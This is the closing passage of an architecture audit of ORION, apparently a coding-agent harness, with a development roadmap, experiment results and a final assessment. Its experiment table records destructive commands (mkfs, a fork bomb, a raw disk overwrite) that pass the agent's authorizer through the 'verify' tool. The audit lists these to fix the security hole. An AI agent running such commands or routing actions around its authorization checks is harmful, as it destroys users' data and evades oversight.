│    + token-aware budget from provider capabilities          §6         │
├───────────────────────────────────────────────────────────────────────┤
│  EVIDENCE         plan fold + artifacts + provenance                   │
│    + runtime-derived step evidence (Q1)                    §8/A6       │
│    + attribution surface that CONSUMES the digest           §16.8      │
├───────────────────────────────────────────────────────────────────────┤
│  STORE            Store interface (extract; SQLite is impl #1)  A10    │
│    + busy_timeout FIRST                                     §11/R1     │
│    + contract_version stamped in run.created                 A13       │
│    + retention / compaction of heartbeat events              A12       │
└───────────────────────────────────────────────────────────────────────┘
```

### 17.3 The five structural changes

**S-1 — One composition root.** Today `cli/index.mjs` builds the worker one way, `repl.mjs` shares
it, tests build it six other ways, and the SDK offers 66 loose exports. Every product-surface defect
in this audit (D2, D3, provider unwired, streaming unreachable) lives in that gap. A single
`createRuntime()` that the CLI, the REPL, the SDK **and the shipped-configuration tests** all call
makes "implemented but unwired" *unrepresentable*. This is the highest-leverage change in the
document and it is a day of work.

**S-2 — Authorization covers every shell-bearing tool.** `action.command` must be populated for any
tool whose arguments reach a shell, not just `bash` (§10.2). Then add a **grant store**: an approval
can be remembered for a session, a project, or a command pattern — so `npm test` is approved once,
not once per turn (§5). This is what makes the default posture survivable *before* a real sandbox
exists.

**S-3 — `SandboxBackend` as a real interface.** Keep `LocalSandbox` and keep its honest
documentation. Add a container backend that provides an actual boundary, and derive the default
posture from the backend's declared capability: **isolated ⇒ auto-allow; not isolated ⇒ escalate.**
That is precisely how Claude Code and Codex earn their autonomy, and it makes the posture a
*consequence* of the boundary rather than a guess. This moves Wave 10 much earlier.

**S-4 — Runtime evidence outranks model assertion.** Fold `tool.succeeded` (mutating), the `write`
pre-state witness and the `verify` verdict into step state alongside the model's claim (Q1). A step
the model never marked but whose window contains a successful mutation *and* a passing verify is
evidence of completion; a step marked `done` whose window contains neither is flagged. This fixes
E9-C in the direction the project's own thesis demands.

**S-5 — Context priority ordering.** Pin the task statement, the current plan and the most recent
verify verdict outside the recency window. Deterministic, no model call, no contract change, and it
directly attacks the measured 162-message cliff (§6). Add `context.retrieved` — already reserved —
as a tool so the agent can pull back a dropped message instead of forgetting it.

### 17.4 Explicitly preserved

The event log and its closed additive vocabulary · the recovery contract and ADR-011's witness ·
zero production dependencies · the honest sandbox documentation · replay's structural zero-model-call
property · `explain` · the `runtime ≠ evaluation` boundary.

---

## 18. Recommended capability sequence

The master plan's dependency graph is sound. Three changes, each justified by a finding.

### Wave 4.5 — CORRECTNESS AND SURFACE (new; do this first) · effort **S** · risk **LOW**
Nothing new is built. Everything here is a defect found by this audit.
1. **S1** — route `verify`'s command through the authorizer (§10.2). **Blocking.**
2. **R1** — `busy_timeout` before `journal_mode` (§11, A/B-proven).
3. **Wave 4 capability declarations** — `openai-compat` declares `streaming`; `anthropic` implements
   `invokeStream` or drops the claim (§3.2).
4. **Wire Wave 4 to the CLI** — `ORION_PROVIDER`, `--stream`.
5. **Documentation truth** — README 31→39 types, assertion counts, `SECURITY.md` hard-deny claim,
   the R3 lease-semantics change.
6. **Don't create a run before validating config** (§5).
7. **`tests/shipped/`** — the missing test class (§13). **This is the wave's real deliverable.**
8. **Publish 0.2.0** with a changelog. Waves 1–4 become real.

*Rationale: five of the seven items are false statements or unreachable code in a shipped artifact.
Nothing else should be built while `SECURITY.md` asserts a guarantee the code does not meet.*

### Wave 5 — USABLE AUTONOMY (promoted from Wave 10) · effort **L** · risk **MEDIUM**
- Grant store: session / project / pattern approvals (§5, A4)
- `SandboxBackend` interface; container backend as impl #2 (§10/S2)
- Posture derived from backend capability: isolated ⇒ auto-allow
- Network policy per domain (§10/S4)
- Live output during a run (§5)

*Rationale: A4 says no isolation ⇒ no safe autonomy ⇒ unusable defaults. This is the adoption
blocker, and the master plan's "Wave 10, independent" underrates it. It is on the critical path.*

### Wave 6 — EVIDENCE INTEGRITY · effort **M** · risk **MEDIUM**
- Q1: runtime-derived step evidence (§8, A6, S-4)
- Attribution surface consuming the Wave 4a digest (§16.8)
- `replay --diff` / "what did the model see at turn N" (§16.5)
- Fork rewinds the workspace via the checkpoints that already exist (§16.6)

*Rationale: four differentiators are collected-but-unconsumed or half-delivered. This wave converts
existing evidence into user value at low risk, and fixes the one live falsehood (E9-C).*

### Wave 7 — CONTEXT MATURITY 2.0 · effort **M** · risk **MEDIUM**
- Priority ordering / pinning (§6, S-5)
- `context.retrieved` as a real retrieval tool (reserved type, finally emitted)
- Token-aware budgeting from provider capabilities
- Continuation semantics on drop (TrueForge's pattern)

### Wave 8 — STANDARD SURFACE · effort **L** · risk **LOW**
- `glob`, regex `grep`, git tools · project instructions file · `--json` everywhere ·
  TypeScript types · model switching · cost/token surface

### Wave 9 — RESOURCE IDENTITY (unchanged from master plan Wave 5) · **L** · **HIGH**
Resources with identity and lifecycle so resume *reattaches*. **Must precede MCP.**

### Wave 10 — SKILLS + MCP (master plan Wave 6) · **XL** · **HIGH**

### Wave 11 — SUBAGENTS (master plan Wave 7) · **L** · **MEDIUM**
Emit the reserved `child.*`. ORION's version is differentiated: a subagent is a **child trajectory
with real lineage**, replayable and forkable — which no competitor's subagents are.

### Wave 12 — MEMORY (master plan Wave 8) · **L** · **MEDIUM-HIGH** (contract change)

### Wave 13 — TRAJECTORY UX + SDK (master plan Wave 9) · **M** · **LOW**
Sessions/turns as a product projection; timeline, filter, paging, search, artifact navigation.

### Wave 14 — TEAM LEARNING (master plan Wave 11) · research only

### On the Wave 11 north star

**The "git for coding harnesses" idea remains physically reachable, and the current waves have not
damaged it.** The prerequisite is per-member attributable provenance, and the substrate has the
shape: `scope` and `principal` columns exist on `runs` (unenforced), every event is attributable to
a run, Wave 4a records *which provider and which request digest* produced each turn, and the plan
fold already distinguishes model claim from recorded fact.

Two things must not be lost, and one must be added:
- **Do not lose:** the closed additive contract (cross-version comparison of old trajectories is the
  entire premise) and the model-claim/runtime-evidence distinction (Q1 sharpens it).
- **Must add, cheaply, soon:** stamp `principal` and `contract_version` into `run.created` (A13).
  Both are one line and both are unrecoverable retroactively. Everything else can wait.

**Do not build it now.** It needs real multi-user usage data, and there is none.

---

## 19. Things we should explicitly NOT build

| Idea | Why not |
|---|---|
| **A feature-parity race with Claude Code** | ~28 of 30 standard capabilities, an OS sandbox, and a large team. Parity is unreachable and pursuing it destroys the differentiator. Compete on trustworthy records. |
| **A workflow engine for planning** | The fold-over-events plan is correct and cheap. A scheduler would move truth out of the log. Master plan already rejected this; reconfirmed. |
| **Vector DB / semantic memory now** | Retrieval need is unmeasured. Hermes scored 5/5 on memory and it did not make it a better *coding* harness. |
| **A broad provider catalog** | The seam is good; it is *unwired* (§3.2). Adding a fifth provider before the CLI can reach the second is pure motion. |
| **Skills marketplace** | Out of scope, at any horizon. |
| **Multi-tenancy** | `scope`/`principal` exist and are unenforced. No demand. Do not enforce speculatively — but *do* stamp `principal` for the Wave 11 option (§18). |
| **Claiming OS isolation** | False today (E4). The honest documentation is an asset; keep it. |
| **Storing model reasoning / hidden CoT** | Store execution metadata and evidence. Unchanged. |
| **Autonomous self-modification** | Violates reviewability, which is the whole point of Wave 11. |
| **A full JS→TS or JS→Python rewrite** | §12. Would invalidate four waves of crash/replay assurance and fix none of the top five findings. |
| **Rebuilding compaction** | It is well-built and deterministic. The problem is that it never fires (§6) and that nothing else manages long-horizon context. Fix the trigger and add priority ordering; do not rewrite. |
| **A web UI / IDE extension** | Premature. No developer outside the project uses the CLI yet. |
| **LSP integration** | Expensive, and not what anyone will choose ORION for. |
| **One event per streamed token** | Wave 4b rejected this correctly; reconfirming so it is not revisited. |
| **Loosening the closed event vocabulary** | The additive discipline is *why* E8 passes. It is the most under-sold asset in the system. |
| **Fixing the findings in this session** | Explicitly out of scope. Every finding here carries its evidence so it can be fixed deliberately, with a test. |

---

## 20. Evidence and references

### 20.1 Experiments run for this audit

All scripts are in the session scratchpad; each drives the **real** modules under
`v0/src` by absolute `file://` import. No product file was modified.

| # | Experiment | Key result |
|---|---|---|
| **E1** | Context/log growth over 20 / 50 / 100 turns through the real Worker, real tools, real store | ctx flat ~10 kB; **0 compactions, 0 artifacts in 170 round-trips**; 162 dropped messages @100 turns; replay 1 ms |
| **E2** | Authorizer decisions for 16 real commands × 3 postures | `auto` escalates `npm test`, `pytest`, `make`, `git status/diff`, `go build`, `cargo test`; `verify` = `allow` everywhere |
| **E3** | Hard-deny bypass through `verify` at `strict` | `mkfs`, fork bomb, `dd of=/dev/sda` → `allow`, no tool-level guard |
| **E4** | Containment: path-checked tools vs `exec` | tools contained; `bash` reads/writes outside the root and reaches the network; `scrubEnv` works |
| **E5** | 8 worker processes × 40 runs, one SQLite file | 0 double-claims, 0 gaps, 0 dupes, 40/40 completed; 2,837 ev/s; 2 workers died at `new Store()` |
| **E6** | N concurrent `new Store()` on an existing WAL DB | 2→1 fail, 8→4 fail, 16→8 fail; reproduced ×3 |
| **E7** | PRAGMA-order A/B on a fresh DB | store-order 5/16 fail; busy-first 0/16 |
| **E8** | **Contract evolution**: v1 log, orphaned mid-edit, under v4 code | read ✓ replay ✓ equivalence ✓ fork ✓ **resume to completion ✓**, orphan recovered `SELF_VERIFYING → reissue(not-applied)`, file fixed, mixed log still replays |
| **E9** | Completion-contract truthfulness, 4 scenarios | A ✓ B ✓ **C: work done + verified → `failed`** ✗ D ✓ |
| **E10** | Concurrent opens while a writer is active | 0 failures — an active writer serialises the opens and hides R1 |
| **E11** | **Controlled A/B**, already-WAL DB + real schema, 36 opens | store-order **16 failed**; busy-first **0 failed** |

### 20.2 ORION source cited

`agent/loop/worker.mjs` (:443 authz action, :88 heartbeat, :621 budget, `DEFAULT_SYSTEM`) ·
`core/run/store.mjs` (:64-68 PRAGMA order, :157-187 leases) · `sandbox/local/index.mjs` (:23-36
`_abs`, :71 grep, :123 exec, `attachCheckpoints`, `scrubEnv`) · `auth/default/index.mjs` (:73
denyCommandPatterns, postures) · `core/recovery/index.mjs` (`classifyShell`, `isKnownDangerous`,
`decideRecovery`) · `core/event/index.mjs` (v4, 39 types, RESERVED) · `core/projection/index.mjs`
(WINDOW, MSG_CLAMP, `default:` branch) · `core/projection/compact.mjs` · `core/projection/plan.mjs` ·
`core/projection/artifacts.mjs` · `core/replay/index.mjs` · `core/lease/reaper.mjs` ·
`core/run/explain.mjs` · `agent/tools/index.mjs` · `agent/model/index.mjs` (`createProvider`) ·
`agent/model/anthropic.mjs` (:129 capabilities) · `agent/model/stream.mjs` · `cli/index.mjs` (:73
`buildModel`, :429 `printLive`, `defaultCompletionContract`) · `cli/repl.mjs` · `src/index.mjs` ·
`tests/crash-matrix.json` · `ADRs/ADR-001…013` · `docs/SECURITY.md` · `README.md` / `v0/README.md` ·
`package.json` · `.github/workflows/ci.yml`

### 20.3 Prior ORION records read

`MASTER-HARNESS-DEVELOPMENT-PLAN.md` · `wave1-report.md` · `wave2-report.md` · `wave3-report.md` ·
`wave4-plan.md` · `wave4-impl-prompt.md` · `future-queue.md` · `research/corpus/SIX-REPOSITORY-EXPANSION.md` ·
`research/corpus/SIX-REPOSITORY-MANIFEST.md` · `research/COMPARISON.md` · commit messages `1be187a`, `c8b106f`.

**Note on the brief's reading list:** `wave4-report.md` **does not exist**. Waves 1–3 each produced a
report; Wave 4 produced a plan, an implementation prompt, and two detailed commit messages. The
commit messages are unusually thorough and I used them as the wave record, but the gap is worth
naming — the Wave 4 defects in §3.2 are exactly the kind a report's manual-testing section catches.

### 20.4 Competitor sources (fetched 2026-09-05)

- Claude Code overview — https://code.claude.com/docs/en/overview
- Claude Code sandboxing — https://code.claude.com/docs/en/sandboxing (Seatbelt / bubblewrap / seccomp / network proxy / auto-allow / `failIfUnavailable`)
- Codex CLI — https://learn.chatgpt.com/docs/codex/cli (Seatbelt / Landlock; read-only, workspace-write, danger-full-access; AGENTS.md; `codex exec`; `codex resume`; MCP; subagents)
- OpenAI Codex repo — https://github.com/openai/codex
- OpenCode — https://opencode.ai/docs/ (plan mode, sessions, `/undo`/`/redo`, `/share`, LSP, MCP, permissions, server mode, SDK, subagents, plugins, AGENTS.md)
- deepagents — https://github.com/langchain-ai/deepagents (planning, pluggable backends, subagents, summarization + tool-output offload, skills, memory, HITL, MCP, LangGraph checkpointing)
- TrueForge / OpenHarness / Deep Agents / QM / Hermes / Ruflo — the pinned local audit at `research/corpus/` and `research/COMPARISON.md`

### 20.5 Reproduced facts vs. the brief's stated facts

| Brief said | I found |
|---|---|
| 904 passed / 0 failed / 30 suites | **confirmed** |
| Event contract v4, 39 types, additive | **confirmed**, and additivity verified functionally (E8) |
| `@kernlbase/orion@0.1.2`, 0 deps, node ≥22, bin `orionctl` | **confirmed** |
| 22 `.mjs` modules, ~4,741 LOC | **confirmed** exactly |
| CI exists and is tracked, 4 cells green | **confirmed** — the "no CI" memory is wrong |
| Wave 4 is done | **confirmed as committed and tested**, but **unreachable from any product surface** (§3.2) |
| Sandbox is containment, not isolation | **confirmed and quantified** (E4) — and `bash`/`verify` have *no* containment |
| `wave4-report.md` exists | **it does not** (§20.3) |

---

## 21. Open questions requiring experiments

Each states the question, why it matters, and a runnable recipe. Everything below is
`UNKNOWN — NOT YET MEASURED`.

**Q1 — What is the real long-horizon failure point?**
E1 shows context flat at 10 kB and 162 messages dropped at 100 turns with a scripted model. Does a
*real* model degrade gracefully or fall off a cliff when the task statement scrolls out?
*Recipe:* one real model, a task needing ≥60 turns, instrumented every 10 turns for: can the agent
still restate the goal? does it revisit finished files? does the plan drift? Report the turn at
which goal fidelity breaks. **Decides whether S-5 (pinning) is sufficient or retrieval is required.**

**Q2 — What does the event log actually cost over a month of real use?**
A12 is unmodelled. E1 measured ~124 B of payload per event but 5.5–10.7 kB of DB-plus-WAL per event
at small scale.
*Recipe:* 100 realistic runs; measure DB size, WAL growth after checkpoint, `explain` latency, and
`claim()` latency at 10⁴/10⁵/10⁶ total events. **Decides whether retention/GC is needed before Wave 8.**

**Q3 — How often does the completion contract produce a false negative with real models?**
E9-C proves the failure mode exists; the rate is unknown, and Wave 2 measured only two model families.
*Recipe:* N models × M tasks; for each run, compare the ground-truth workspace/test state against the
recorded verdict. Report false-positive and false-negative rates **separately**. **Decides Q1(Wave 6)
priority.** This is `eval/` work, never a README claim.

**Q4 — Does a container backend actually enable auto-allow without breaking the recovery contract?**
S-3 assumes it does. But a container changes the filesystem identity the pre-state witness is
computed against, and `attachCheckpoints` shells out to host `git`.
*Recipe:* implement a minimal container backend; run the full 16-point crash matrix inside it; assert
zero duplicate effects and identical recovery decisions. **Blocking for Wave 5.**

**Q5 — At what scale does the single-writer store become the binding constraint?**
E5 measured 2,837 ev/s with 8 processes and trivial work. Real workers spend most time in model calls.
*Recipe:* sweep 1/2/4/8/16/32 workers with realistic think-time; measure claim latency p50/p99, append
p99, and `database is locked` incidence **after** the R1 fix. **Decides when the `Store` interface
must be extracted (A10).**

**Q6 — Does compaction ever fire on real work, or is it structurally dead?**
E1: 0/170 with scripted output. Wave 3's manual run: 0/134 with a real model. One realistic run
triggered it via 29 kB of test output.
*Recipe:* instrument 20 real runs on real repositories; report the distribution of outbound bytes and
largest single tool result. **Decides whether to retune `contextBudgetBytes`, lower the artifact
threshold, or accept that artifacts (not compaction) are the real mechanism.**

**Q7 — Can a v1 log be replayed by a v1 *reader* after the contract reached v4?**
E8 proved **forward** compatibility (old log, new code). The reverse — a pinned older ORION reading a
v4 log — is untested. `fold`'s `default: break` suggests it degrades silently rather than throwing
`[INFERENCE]`, but `Store.append` would reject a v4 type outright.
*Recipe:* check out `00b68a6`, point it at a v4 log, attempt `explain`/`replay`/`resume`. **Decides
whether a version stamp (A13) needs a compatibility policy, not just a field.**

**Q8 — Is fork actually usable once the workspace is rewound?**
`attachCheckpoints` exists and is never invoked (§16.6).
*Recipe:* enable checkpoints, fork at 5 points in a real run, restore the workspace to each, resume,
and check whether the agent behaves coherently or re-does work. **Decides whether fork is a real
feature or a demo.**

**Q9 — Does provenance actually resolve model-vs-harness attribution?**
Wave 4a's premise, never tested against a real disagreement.
*Recipe:* run the same task 20× across two providers and two ORION versions; use `request_digest`
alone to partition failures into model / provider / harness / tool. Report how many are resolvable.
**Decides whether §16.8's differentiator is real.**

**Q10 — What is the cost of the `tests/shipped/` discipline?**
S-1 asserts a composition root makes "implemented but unwired" unrepresentable.
*Recipe:* implement it, then re-introduce each of the four historical defects (D2, D3, Wave 4
capability inversion, streaming unreachable) and confirm the new suite catches all four. **This is the
acceptance test for Wave 4.5 item 7.**

---

## Final statement

> **If we continue building ORION according to the current architecture, can this realistically
> become a serious developer-facing coding harness providing the standard functionality people
> expect from Claude Code/Codex/OpenCode while retaining genuinely differentiated durable execution
> infrastructure?**

# **YES, BUT.**

**YES** — the durable-execution substrate is real, verified, and better than anything else audited.
Effect-aware recovery across the crash window, deterministic zero-cost replay, execution fencing,
arbitrary fork with lineage, and an additive event contract that let a six-month-old orphaned run
resume under four-versions-newer code (E8, demonstrated in this audit) are capabilities no
competitor has, and they are the ones that cannot be retrofitted later. The architecture has
absorbed three capability waves without deforming, which is the strongest available evidence that it
can absorb the rest. The standard functionality that is missing is missing because it has not been
built yet — not because the design forecloses it.

**BUT** — the product is currently worse than the source tree, and the source tree currently
contains a security regression against its own written guarantee. Concretely, and in priority order:
`verify` must stop bypassing the authorization posture; Waves 1–4 must be published so the artifact
users install is not the one Wave 0 caught lying; the `tests/shipped/` class must exist so the
"implemented but unwired" pattern stops repeating at one occurrence per wave; a real sandbox backend
must arrive early, because ORION cannot be pleasant to use while it pauses on `npm test` and it
cannot safely auto-allow without a boundary; and the completion contract must stop reporting failure
on work that demonstrably succeeded.

None of those five is architectural. All five are the same underlying failure: **excellent
mechanisms, insufficiently connected to the thing a developer actually runs.** That is a discipline
and sequencing problem, and this audit's §17 and §18 are a concrete answer to it.

The strategic conclusion is narrower than the roadmap implies, and I would state it plainly: **ORION
will not win on feature count and should stop measuring itself that way.** What it can credibly own
— and what nothing else in the field can — is being the harness whose record of what happened is
trustworthy enough to act on: for CI, for unattended and long-horizon work, for post-incident
forensics, and eventually for the team-learning north star. Every differentiator in §16 serves that
position. Every one of the top five findings is currently undermining it.

Fix those five, and the answer becomes an unqualified yes.

---

**END OF AUDIT. No product code was modified. No wave was started.**
